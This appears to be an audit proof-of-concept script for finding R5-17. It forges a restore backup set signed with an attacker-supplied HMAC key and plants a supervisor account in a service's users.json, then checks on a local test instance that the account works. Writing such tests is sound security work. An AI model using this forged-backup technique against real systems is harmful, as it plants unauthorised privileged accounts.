"""R5-17 (P6 residual): restore.py's trust root is 'the HOST' — but the
host's audit key is looked up in the RESTORE SHELL's environment or a
key file beside the DB. On an env-key deployment (the key lives in the
service's environment, no key file) restored from a shell without that
variable, host_key is None; _find_audit_key then falls back to the
audit_key file INSIDE the backup set, and a set HMAC'd under the
attacker's own key verifies against itself (restore.py:114-126,
204-229). The host's signing_pub.pem — present beside the DB — is not
required when the HMAC 'verifies'. The attacker swaps users.json and
keeps the real DB, so Janus boots normally with the real env key."""
import hashlib
import hmac
import io
import json
import os
import shutil
import sys
import tarfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import lib5 as L  # noqa: E402
from lib5 import req, finding  # noqa: E402


def main():
    R = L.instance("r5-envkey", 19290)      # env-key deployment
    R.start()
    R.stop()
    has_host_pub = os.path.exists(R.db + ".signing_pub.pem")
    out = os.path.join(R.dir, "backups")
    r = L.run_script("backup.py", dict(R.env), ["--out", out,
                                                "--no-prune"])
    assert r.returncode == 0, r.stdout + r.stderr
    bset = os.path.join(out, sorted(os.listdir(out))[-1])
    evil = os.path.join(R.dir, "evil-set")
    shutil.copytree(bset, evil)
    users = json.load(open(R.users))
    users.append({"user": "evil.sup", "role": "supervisor",
                  "key_sha256": hashlib.sha256(b"EVIL").hexdigest()})
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for arc, data in (("users.json", json.dumps(users).encode()),
                          ("cases.json", open(R.cases, "rb").read()),
                          ("cameras.json", open(R.cameras, "rb").read())):
            ti = tarfile.TarInfo(arc)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    open(os.path.join(evil, "config.tar.gz"), "wb").write(buf.getvalue())
    att_key = "attacker-chosen-hmac-key"
    open(os.path.join(evil, "audit_key"), "w").write(att_key)
    m = json.load(open(os.path.join(evil, "manifest.json")))
    m["files"]["audit_key"] = {}
    for name in list(m["files"]):
        raw = open(os.path.join(evil, name), "rb").read()
        m["files"][name].update(sha256=hashlib.sha256(raw).hexdigest(),
                                size=len(raw))
    for k in ("manifest_sig", "sig_alg"):
        m.pop(k, None)
    body = {k: v for k, v in m.items() if k != "manifest_hmac"}
    m["manifest_hmac"] = hmac.new(att_key.encode(),
                                  L.sentinel.canonical_bytes(body),
                                  hashlib.sha256).hexdigest()
    json.dump(m, open(os.path.join(evil, "manifest.json"), "w"))
    shell_env = dict(os.environ)
    shell_env.pop("NOCTUA_AUDIT_KEY", None)   # operator's root shell
    cfg = os.path.join(R.dir, "config-restored")
    rr = L.run_script("restore.py", shell_env,
                      [evil, "--db", R.db, "--config-dir", cfg])
    restored = json.load(open(os.path.join(cfg, "users.json"))) \
        if os.path.exists(os.path.join(cfg, "users.json")) else []
    # the service comes back up with its real env key and the
    # restored config
    R.env["NOCTUA_USERS"] = os.path.join(cfg, "users.json")
    up, s_evil = False, None
    try:
        R.start()
        up = True
        s_evil, _b = req(R.port, "GET", "/hits", "evil.sup",
                         raw_key="EVIL")
    finally:
        if up:
            R.stop()
    finding("R5-17", "on an env-key deployment restored from a shell "
            "without NOCTUA_AUDIT_KEY, a set HMAC'd under a key the "
            "attacker shipped INSIDE the set (no Ed25519 signature) is "
            "accepted although the host's signing_pub.pem is present; "
            "Janus then boots normally with the real env key and the "
            "attacker's supervisor account works",
            has_host_pub and rr.returncode == 0
            and any(u["user"] == "evil.sup" for u in restored)
            and s_evil == 200,
            {"host_has_signing_pub": has_host_pub,
             "restore_exit": rr.returncode,
             "restore_out": rr.stdout.strip()[-240:],
             "evil_user_installed": any(u["user"] == "evil.sup"
                                        for u in restored),
             "janus_up_after": up, "evil_sup_GET_hits": s_evil})


if __name__ == "__main__":
    main()
    L.summary()
